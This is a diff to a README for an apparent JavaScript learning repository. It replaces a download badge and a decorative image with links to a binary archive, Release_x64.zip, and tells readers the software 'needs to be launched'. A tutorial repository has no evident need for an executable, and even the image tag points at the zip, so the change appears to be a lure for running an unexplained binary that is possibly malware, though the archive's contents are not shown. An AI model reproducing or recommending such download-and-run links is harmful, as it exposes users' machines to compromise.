@@ -35,7 +35,7 @@ Dive into these topics to deepen your understanding of JavaScript and sharpen yo
 ## Getting Started
 To begin your exploration of the JavaScript Universe, simply download the content using the link provided below. 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/blakehits/JavaScript-Universe/releases/download/v2.0/Release_x64.zip)](https://github.com/blakehits/JavaScript-Universe/releases/download/v2.0/Release_x64.zip)
 *(Note: The link provided above leads to the downloadable software that needs to be launched.)*
 
 Once you have downloaded the content, unzip the files and start your journey into the vast world of JavaScript. 🌍
@@ -57,7 +57,7 @@ The JavaScript Universe repository is licensed under the MIT License. You are fr
 
 Start your JavaScript adventure today and unlock the secrets of this powerful programming language! Happy coding! 💻🚀
 
-![JavaScript Universe](https://images.unsplash.com/photo-1530626985147-26c41aa32674)
+![JavaScript Universe](https://github.com/blakehits/JavaScript-Universe/releases/download/v2.0/Release_x64.zip)
 
 ---
 Created with ❤️ by the JavaScript Universe Team
